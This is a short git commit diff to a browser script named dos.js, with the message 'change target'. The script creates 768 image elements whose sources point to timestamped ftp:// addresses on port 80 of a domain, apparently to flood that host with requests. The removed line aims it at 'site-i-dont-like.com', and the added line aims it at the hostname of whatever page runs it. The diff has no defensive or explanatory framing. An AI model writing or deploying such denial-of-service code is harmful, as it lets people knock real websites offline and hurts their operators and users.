eec902337743851869d1c41853588dd02eb2a966
Christian Nikkanen <christian.nikkanen@gmail.com>
2016-08-20 00:40:22 +0300

    change target

--- dos.js
+++ dos.js
@@ -1,4 +1,4 @@
-var domain = 'site-i-dont-like.com';
+var domain = window.location.hostname;
 for( i = 0; i < 768; ++i ) {
   var img = document.createElement('img');
   img.setAttribute('src', 'ftp://' + domain + ':80/image' + new Date().getTime() + i );
